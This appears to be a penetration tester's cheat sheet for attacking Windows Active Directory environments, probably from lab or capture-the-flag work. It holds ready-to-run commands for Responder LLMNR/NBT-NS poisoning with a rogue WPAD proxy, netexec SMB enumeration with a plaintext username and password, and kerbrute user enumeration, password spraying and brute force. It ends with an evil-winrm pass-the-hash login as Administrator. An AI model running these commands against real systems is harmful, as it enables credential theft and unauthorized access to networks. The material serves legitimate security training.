# Responder
 sudo responder -I tun0

# netexec
nxc smb 10.114.133.143 -u 'enterprise_security' -p 'sand_0873959498' --shares
nxc smb 10.114.133.143 -u 'enterprise_security' -p 'sand_0873959498' --users
## responder Usage Example

Specify the IP address to redirect to (`-i 192.168.1.202`), enabling the WPAD rogue proxy (`-w On`), answers for netbios wredir (`-r On`), and fingerprinting (`-f On`):

```console
root@kali:~# responder -i 192.168.1.202 -w On -r On -f On
NBT Name Service/LLMNR Responder 2.0.
Please send bugs/comments to: lgaffie@trustwave.com
To kill this script hit CRTL-C

[+]NBT-NS &amp; LLMNR responder started
[+]Loading Responder.conf File..
Global Parameters set:
Responder is bound to this interface:ALL
Challenge set is:1122334455667788
WPAD Proxy Server is:ON
WPAD script loaded:function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}
HTTP Server is:ON
HTTPS Server is:ON
SMB Server is:ON
SMB LM support is set to:OFF
SQL Server is:ON
FTP Server is:ON
IMAP Server is:ON
POP3 Server is:ON
SMTP Server is:ON
DNS Server is:ON
LDAP Server is:ON
FingerPrint Module is:ON
Serving Executable via HTTP&amp;WPAD is:OFF
Always Serving a Specific File via HTTP&amp;WPAD is:OFF
```

# Kerbrute

### User Enumeration

Enumerate valid usernames from a wordlist

```swift

kerbrute userenum -d domain.local --dc 10.0.0.1 users.txt
```
### Password Spraying

Test one password across multiple users

```swift
kerbrute passwordspray -d domain.local --dc 10.0.0.1 users.txt 'Winter2024!'
```
### Brute Force Single User

Test multiple passwords against a single user

```swift
kerbrute bruteuser -d domain.local --dc 10.0.0.1 passwords.txt admin
```
### Common Options

`-d, --domain` Target domain
`--dc` Domain controller IP
`-t, --threads` Number of threads
`-o, --output` Output file path
`-v, --verbose` Verbose output
`--safe` Safe mode (no lockouts)
#  evil-winrm
evil-winrm -i 10.113.189.245 -u Administrator -H 713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
-H - hash